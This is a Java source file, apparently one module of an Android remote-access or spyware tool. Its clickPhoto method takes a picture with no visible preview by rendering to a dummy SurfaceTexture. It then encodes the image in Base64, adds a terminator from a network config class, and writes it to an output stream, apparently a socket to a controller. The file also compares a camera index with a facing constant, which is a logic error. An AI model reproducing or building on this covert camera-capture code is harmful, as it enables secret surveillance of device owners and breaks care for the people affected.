package com.poppet.modules.camera;

import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.util.Base64;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;

import static com.poppet.config.NetworkConfig.END_HEADER;

public class takePhoto {

    public static String clickPhoto(int cameraFace, Context mContext, OutputStream out) {
        StringBuffer entireEncodedImage = new StringBuffer();
        Camera camera;
        int cameraId = -1;

        if (mContext.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_ANY)) {
            int totalCameras = Camera.getNumberOfCameras();
            //Loop through all camera Id's to find Relevant Camera
            for (int i = 0; i < totalCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                if (info.facing == cameraFace) {
                    cameraId = i;
                    break;
                }
            }
            if (cameraId != cameraFace) {
                entireEncodedImage.append("Requested camera doesn't seem to exist on the device");
            } else {
                camera = Camera.open(cameraId);
                try {
                    camera.setPreviewTexture(new SurfaceTexture(0));
                    camera.startPreview();
                    camera.takePicture(null, null, new Camera.PictureCallback() {
                        @Override
                        public void onPictureTaken(byte[] data, Camera camera) {
                            if (camera != null) {
                                camera.stopPreview();
                                camera.release();
                                camera = null;
                            }
                            //Convert the data to Image then encode it in Base64 String and send over a new Thread
                            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                            bitmap.compress(Bitmap.CompressFormat.PNG, 90, byteArrayOutputStream);
                            byte[] bytes = byteArrayOutputStream.toByteArray();
                            entireEncodedImage.append(Base64.encodeToString(bytes, Base64.DEFAULT));
                            entireEncodedImage.append(END_HEADER);
                            Thread sendImage = new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    try {
                                        out.write(entireEncodedImage.toString().getBytes("UTF-8"));
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }
                                }
                            });
                            sendImage.start();
                        }
                    });
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        } else {
            entireEncodedImage.append("No Camera hardware was detected on this device\n");
        }
        return entireEncodedImage.toString();
    }
}
